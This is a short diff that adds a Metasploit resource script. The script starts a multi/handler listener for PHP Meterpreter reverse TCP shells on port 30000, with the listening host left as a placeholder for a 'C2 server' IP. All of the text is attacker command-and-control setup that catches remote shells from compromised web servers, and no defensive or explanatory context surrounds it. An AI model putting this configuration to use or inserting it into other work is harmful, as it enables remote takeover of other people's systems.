@@ -1,0 +1,5 @@
+use exploit/multi/handler
+set PAYLOAD php/meterpreter_reverse_tcp
+set LHOST <YOUR C2 SERVER IP>
+set LPORT 30000
+exploit -j
